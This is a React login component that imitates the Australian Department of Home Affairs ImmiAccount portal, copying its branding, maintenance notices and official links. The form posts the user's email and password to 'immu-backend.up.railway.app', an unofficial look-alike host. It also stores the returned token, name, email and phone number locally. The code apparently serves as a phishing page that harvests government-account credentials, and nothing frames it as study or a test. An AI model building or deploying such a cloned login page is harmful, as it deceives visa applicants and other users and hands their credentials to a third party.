/* eslint-disable no-unused-vars */
/* eslint-disable no-dupe-keys */
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";

const LoginPage = () => {
  const navigate = useNavigate();

  /* ------------------------------------------------------------------
     Local state
  ------------------------------------------------------------------ */
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [screenSize, setScreenSize] = useState({
    width: window.innerWidth,
    height: window.innerHeight,
  });

  /* ------------------------------------------------------------------
     Handle screen resize
  ------------------------------------------------------------------ */
  useEffect(() => {
    const handleResize = () => {
      setScreenSize({
        width: window.innerWidth,
        height: window.innerHeight,
      });
    };

    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  /* ------------------------------------------------------------------
     Real API login function
  ------------------------------------------------------------------ */
  const handleLogin = async () => {
    // Clear any existing error
    setErrorMessage("");

    // Basic validation
    if (!username.trim() || !password.trim()) {
      setErrorMessage("Please enter both username and password.");
      return;
    }

    setIsLoading(true);

    try {
      const loginPayload = {
        email: username, // Assuming username is email
        password: password,
      };

      const response = await fetch(
        "https://immu-backend.up.railway.app/login",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(loginPayload),
        }
      );

      if (response.ok) {
        const loginData = await response.json();

        // Save token and user data to localStorage
        if (loginData.idToken) {
          localStorage.setItem("authToken", loginData.idToken);
          localStorage.setItem("userId", loginData.user_id);

          // Store additional user data
          const userData = {
            user_id: loginData.user_id,
            name: loginData.name,
            email: loginData.email,
            phone_number: loginData.phone_number,
          };
          localStorage.setItem("userData", JSON.stringify(userData));

          // Navigate to success page only if token is saved
          const savedToken = localStorage.getItem("authToken");
          if (savedToken) {
            navigate("/gov.au/lusc/successful");
            window.location.reload();
          } else {
            setErrorMessage(
              "Failed to save authentication token. Please try again."
            );
          }
        } else {
          setErrorMessage(
            "Login successful but no token received. Please contact support."
          );
        }
      } else {
        const errorData = await response.json();
        setErrorMessage(
          `Login failed: ${
            errorData.message || "Invalid username or password."
          }\n\n` +
            "Please check the username and password you have entered.\n\n" +
            "Note: Passwords are case sensitive. Check that your CAPS LOCK is off."
        );
      }
    } catch (error) {
      console.error("Login error:", error);
      setErrorMessage(
        "Network error occurred. Please check your internet connection and try again.\n\n" +
          "If the problem persists, please contact support."
      );
    } finally {
      setIsLoading(false);
    }
  };

  /* ------------------------------------------------------------------
     Handle Enter key press
  ------------------------------------------------------------------ */
  const handleKeyPress = (e) => {
    if (e.key === "Enter" && !isLoading) {
      handleLogin();
    }
  };

  /* ------------------------------------------------------------------
     Toggle password visibility
  ------------------------------------------------------------------ */
  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  /* ------------------------------------------------------------------
     Responsive sizing helpers
  ------------------------------------------------------------------ */
  const isMobile = screenSize.width <= 480;
  const isTablet = screenSize.width > 480 && screenSize.width <= 768;
  const isLaptop = screenSize.width > 768 && screenSize.width <= 1200;
  const isDesktop = screenSize.width > 1200;

  const getInputWidth = () => {
    if (isMobile) return "100%";
    if (isTablet) return "350px";
    if (isLaptop) return "400px";
    return "500px";
  };

  const getFontSize = () => {
    if (isMobile) return "12px";
    if (isTablet) return "13px";
    if (isLaptop) return "14px";
    return "15px";
  };

  const getInputHeight = () => {
    if (isMobile) return "16px";
    if (isTablet) return "18px";
    if (isLaptop) return "20px";
    return "22px";
  };

  const getPadding = () => {
    if (isMobile) return "3px 5px";
    if (isTablet) return "4px 6px";
    if (isLaptop) return "5px 7px";
    return "6px 8px";
  };

  const getEyeButtonSize = () => {
    if (isMobile) return { width: "16px", height: "16px", fontSize: "11px" };
    if (isTablet) return { width: "18px", height: "18px", fontSize: "12px" };
    if (isLaptop) return { width: "20px", height: "20px", fontSize: "13px" };
    return { width: "22px", height: "22px", fontSize: "14px" };
  };

  const getPaddingRight = () => {
    if (isMobile) return "25px";
    if (isTablet) return "30px";
    if (isLaptop) return "32px";
    return "35px";
  };

  const getEyeButtonRight = () => {
    if (isMobile) return "5px";
    if (isTablet) return "6px";
    if (isLaptop) return "7px";
    return "8px";
  };

  /* ------------------------------------------------------------------ */
  return (
    <div
      style={{
        fontFamily: "Arial, sans-serif",
        backgroundColor: "#f0f0f0",
        width: "100%",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
      }}
    >
      {/* ---------- Main container ---------- */}
      <div style={{ padding: isMobile ? 10 : 20, backgroundColor: "#CCCCCC", flex: 1 }}>
        <div
          style={{
            backgroundColor: "#ffffff",
            border: "1px solid #ccc",
            borderRadius: 4,
          }}
        >
          {/* ---------- Page header ---------- */}
          <header
            style={{
              background: "#1B3564",
              height: isMobile ? 20 : 25,
              padding: isMobile ? "0 10px" : "0 15px",
              display: "flex",
              alignItems: "center",
              color: "#fff",
              fontWeight: "bold",
              fontSize: isMobile ? 10 : isTablet ? 11 : isDesktop ? 14 : 12,
            }}
          >
            Login
          </header>

          {/* ---------- ERROR BANNER (if any) ---------- */}
          {errorMessage && (
            <div
              style={{
                border: "1px solid #b10000",
                margin: isMobile ? "8px 8px 15px 8px" : "10px 10px 20px 10px",
              }}
            >
              <div
                style={{
                  backgroundColor: "#b10000",
                  color: "#fff",
                  padding: isMobile ? "4px 8px" : "6px 10px",
                  fontWeight: "bold",
                  fontSize: isMobile ? 10 : 12,
                  display: "flex",
                  alignItems: "center",
                }}
              >
                <span
                  style={{
                    width: isMobile ? 8 : 10,
                    height: isMobile ? 8 : 10,
                    borderRadius: "50%",
                    backgroundColor: "#fff",
                    marginRight: isMobile ? 6 : 8,
                    flexShrink: 0,
                  }}
                />
                An error has occurred
              </div>

              <div
                style={{
                  backgroundColor: "#fff",
                  padding: isMobile ? 8 : 12,
                  color: "#333",
                  fontSize: isMobile ? 10 : 12,
                  whiteSpace: "pre-line",
                }}
              >
                {errorMessage}
              </div>
            </div>
          )}

          {/* ---------- Information banner ---------- */}
          <div style={{ border: "1px solid #5CBCE8", margin: isMobile ? 8 : 10 }}>
            <div
              style={{
                backgroundColor: "#72CDF4",
                display: "flex",
                alignItems: "center",
              }}
            >
              <div
                style={{
                  width: isMobile ? 12 : isTablet ? 14 : isDesktop ? 18 : 15,
                  height: isMobile ? 12 : isTablet ? 14 : isDesktop ? 18 : 15,
                  backgroundColor: "#1B3564",
                  borderRadius: "50%",
                  margin: isMobile ? "0 6px" : "0 10px",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#fff",
                  fontWeight: "bold",
                  fontSize: isMobile ? 10 : isTablet ? 11 : isDesktop ? 14 : 12,
                }}
              >
                i
              </div>
              <h4
                style={{
                  margin: 0,
                  color: "#1B3564",
                  fontWeight: "bold",
                  fontSize: isMobile ? 12 : isTablet ? 13 : isDesktop ? 16 : 14,
                }}
              >
                Information
              </h4>
            </div>

            <div
              style={{
                backgroundColor: "#fff",
                padding: isMobile ? 10 : 15,
                lineHeight: 1.4,
                fontSize: isMobile ? 9 : isTablet ? 10 : isDesktop ? 12 : 10,
                color: "#333",
              }}
            >
              <p style={{ margin: "0 0 10px 0", fontSize: isMobile ? 14 : isTablet ? 15 : isDesktop ? 18 : 16 }}>
                <strong>Planned system maintenance</strong>
              </p>
              <p style={{ margin: "0 0 10px 0" }}>
                <strong>ImmiAccount</strong> will be unavailable from:
              </p>
              <ul style={{ margin: "0 0 10px 20px" }}>
                {/* <li>5 am – 8 am (AEST) Wednesday 6 August 2025</li> */}
              </ul>
              <p style={{ margin: "0 0 10px 0" }}>
                Please refer to{" "}
                <a
                  href="https://www.homeaffairs.gov.au/help-and-support/system-maintenance-and-technical-issues"
                  style={{ color: "#1B3564", textDecoration: "underline" }}
                >
                  System Maintenance
                </a>{" "}
                to view a complete list of online services that will be
                affected.
              </p>
              <p style={{ margin: 0 }}>We apologise for any inconvenience.</p>
              <p
                style={{
                  margin: "18px 0 10px 0",
                  fontSize: isMobile ? 14 : isTablet ? 15 : isDesktop ? 18 : 16,
                  color: "#1B3564",
                }}
              >
                <strong>MFA is now required to access ImmiAccount</strong>
              </p>
              <p style={{ margin: 0 }}>
                For more information see{" "}
                <a
                  href="https://immi.homeaffairs.gov.au/news-media/archive/article?itemId=1325"
                  style={{ color: "#1B3564", textDecoration: "underline" }}
                >
                  Multi-factor Authentication (MFA) is now live
                </a>
              </p>
            </div>
          </div>

          {/* ---------- Login form ---------- */}
          <div style={{ padding: isMobile ? 12 : 20 }}>
            <h1
              style={{
                fontSize: isMobile ? 14 : isTablet ? 16 : isDesktop ? 20 : 16,
                margin: "0 0 15px 0",
                fontWeight: "normal",
                color: "#1B3564",
              }}
            >
              Login to ImmiAccount
            </h1>

            <p
              style={{
                fontSize: isMobile ? 9 : isTablet ? 10 : isDesktop ? 12 : 10,
                margin: "0 0 15px 0",
                color: "#000",
              }}
            >
              Fields marked <span style={{ color: "#d9534f" }}>*</span> must be
              completed.
            </p>

            {/* ---------- Username field ---------- */}
            <div
              style={{
                marginBottom: 15,
                display: "flex",
                flexDirection: isTablet || isMobile ? "column" : "row",
                alignItems: isTablet || isMobile ? "stretch" : "center",
                gap: isMobile ? 8 : 15,
              }}
            >
              <label
                style={{
                  fontSize: isMobile ? 10 : isTablet ? 11 : isDesktop ? 12 : 10,
                  color: "#333",
                  minWidth: !isMobile && !isTablet ? 60 : "auto",
                }}
              >
                Username <span style={{ color: "#d9534f" }}>*</span>
              </label>

              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onKeyPress={handleKeyPress}
                disabled={isLoading}
                placeholder="Enter your email address"
                style={{
                  width: getInputWidth(),
                  padding: getPadding(),
                  fontSize: isMobile ? 10 : isTablet ? 11 : isDesktop ? 12 : 10,
                  border: "1px solid black",
                  height: getInputHeight(),
                  background: isLoading ? "#f5f5f5" : "#fff",
                  marginLeft: !isMobile && !isTablet ? 147 : 0,
                  cursor: isLoading ? "not-allowed" : "text",
                  boxSizing: "border-box",
                }}
              />
            </div>

            {/* ---------- Password field with eye button ---------- */}
            <div
              style={{
                marginBottom: 15,
                display: "flex",
                flexDirection: isTablet || isMobile ? "column" : "row",
                alignItems: isTablet || isMobile ? "stretch" : "center",
                gap: isMobile ? 8 : 15,
              }}
            >
              <label
                style={{
                  fontSize: isMobile ? 10 : isTablet ? 11 : isDesktop ? 12 : 10,
                  color: "#333",
                  minWidth: !isMobile && !isTablet ? 60 : "auto",
                }}
              >
                Password <span style={{ color: "#d9534f" }}>*</span>
              </label>

              <div
                style={{
                  position: "relative",
                  display: "inline-block",
                  marginLeft: !isMobile && !isTablet ? 150 : 0,
                  width: getInputWidth(),
                }}
              >
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyPress={handleKeyPress}
                  disabled={isLoading}
                  placeholder="Enter your password"
                  style={{
                    width: "100%",
                    padding: getPadding(),
                    paddingRight: getPaddingRight(),
                    fontSize: isMobile ? 10 : isTablet ? 11 : isDesktop ? 12 : 10,
                    border: "1px solid black",
                    height: getInputHeight(),
                    background: isLoading ? "#f5f5f5" : "#fff",
                    cursor: isLoading ? "not-allowed" : "text",
                    boxSizing: "border-box",
                  }}
                />
                
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  disabled={isLoading}
                  style={{
                    position: "absolute",
                    right: getEyeButtonRight(),
                    top: "50%",
                    transform: "translateY(-50%)",
                    background: "none",
                    border: "none",
                    cursor: isLoading ? "not-allowed" : "pointer",
                    fontSize: getEyeButtonSize().fontSize,
                    color: "#666",
                    padding: "0",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    width: getEyeButtonSize().width,
                    height: getEyeButtonSize().height,
                    borderRadius: "2px",
                    transition: "background-color 0.2s",
                  }}
                  title={showPassword ? "Hide password" : "Show password"}
                  onMouseOver={(e) => !isLoading && (e.target.style.backgroundColor = "#f0f0f0")}
                  onMouseOut={(e) => (e.target.style.backgroundColor = "transparent")}
                >
                  {showPassword ? "👁️" : "👁️‍🗨️"}
                </button>
              </div>
            </div>

            {/* ---------- Button bar ---------- */}
            <div
              style={{
                backgroundColor: "#E5E5E5",
                border: "1px solid #ccc",
                height: isMobile ? 30 : isTablet ? 35 : isDesktop ? 40 : 35,
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 15,
              }}
            >
              <button
                type="button"
                onClick={() => navigate("/")}
                disabled={isLoading}
                style={{
                  marginLeft: isMobile ? 6 : 10,
                  padding: isMobile ? "3px 8px" : isTablet ? "4px 12px" : isDesktop ? "6px 16px" : "4px 12px",
                  fontSize: isMobile ? 8 : isTablet ? 9 : isDesktop ? 11 : 9,
                  backgroundColor: isLoading ? "#ccc" : "#f5f5f5",
                  border: "1px solid black",
                  cursor: isLoading ? "not-allowed" : "pointer",
                  height: isMobile ? 20 : isTablet ? 24 : isDesktop ? 28 : 24,
                }}
              >
                Cancel
              </button>

              <button
                type="button"
                onClick={handleLogin}
                disabled={isLoading}
                style={{
                  marginRight: isMobile ? 6 : 10,
                  padding: isMobile ? "3px 8px" : isTablet ? "4px 12px" : isDesktop ? "6px 16px" : "4px 12px",
                  fontSize: isMobile ? 8 : isTablet ? 9 : isDesktop ? 11 : 9,
                  backgroundColor: isLoading ? "#ccc" : "#f5f5f5",
                  border: "1px solid black",
                  cursor: isLoading ? "not-allowed" : "pointer",
                  height: isMobile ? 20 : isTablet ? 24 : isDesktop ? 28 : 24,
                }}
              >
                {isLoading ? "Logging in..." : "Login"}
              </button>
            </div>

            {/* ---------- Help links ---------- */}
            <div
              style={{
                textAlign: isMobile ? "center" : "right",
                fontSize: isMobile ? 8 : isTablet ? 9 : isDesktop ? 11 : 9,
                marginBottom: 5,
              }}
            >
              I have forgotten my ImmiAccount{" "}
              <a
                href="#"
                style={{ color: "#1B3564", textDecoration: "underline" }}
              >
                username
              </a>{" "}
              or{" "}
              <a
                href="#"
                style={{ color: "#1B3564", textDecoration: "underline" }}
              >
                password
              </a>
            </div>
            <div
              style={{
                textAlign: isMobile ? "center" : "right",
                fontSize: isMobile ? 8 : isTablet ? 9 : isDesktop ? 11 : 9,
              }}
            >
              I no longer have access to my{" "}
              <a
                href="#"
                style={{ color: "#1B3564", textDecoration: "underline" }}
              >
                multi-factor authentication app
              </a>
            </div>
          </div>

          {/* ---------- Create-account section ---------- */}
          <div
            style={{
              backgroundColor: "#ffffff",
              borderTop: "1px dotted #ccc",
              padding: isMobile ? 12 : 20,
            }}
          >
            <h2
              style={{
                fontSize: isMobile ? 14 : isTablet ? 16 : isDesktop ? 20 : 16,
                margin: "0 0 8px 0",
                fontWeight: "normal",
                color: "#1B3564",
              }}
            >
              Create an ImmiAccount
            </h2>

            <p
              style={{
                fontSize: isMobile ? 9 : isTablet ? 10 : isDesktop ? 12 : 10,
                margin: "0 0 15px 0",
                color: "#333",
                lineHeight: 1.4,
              }}
            >
              Create an ImmiAccount to access the Department of Home Affairs's
              online services.
            </p>

            <div
              style={{
                display: "flex",
                flexDirection: isMobile ? "column" : "row",
                gap: isMobile ? 8 : 10,
                alignItems: "flex-start",
              }}
            >
              <button
                onClick={() => navigate("/gov.au/lusc/signup")}
                disabled={isLoading}
                style={{
                  padding: isMobile ? "3px 8px" : isTablet ? "4px 10px" : isDesktop ? "6px 14px" : "4px 10px",
                  fontSize: isMobile ? 8 : isTablet ? 9 : isDesktop ? 11 : 9,
                  backgroundColor: isLoading ? "#ccc" : "#fff",
                  border: "1px solid black",
                  cursor: isLoading ? "not-allowed" : "pointer",
                  height: isMobile ? 20 : isTablet ? 24 : isDesktop ? 28 : 24,
                }}
              >
                Create ImmiAccount
              </button>

              <button
                type="button"
                disabled={isLoading}
                style={{
                  width: isMobile ? 14 : isTablet ? 16 : isDesktop ? 20 : 16,
                  height: isMobile ? 14 : isTablet ? 16 : isDesktop ? 20 : 16,
                  fontSize: isMobile ? 7 : isTablet ? 8 : isDesktop ? 10 : 8,
                  color: "#fff",
                  backgroundColor: isLoading ? "#ccc" : "#1E70BC",
                  border: "1px solid #428bca",
                  borderRadius: "50%",
                  cursor: isLoading ? "not-allowed" : "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                ?
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
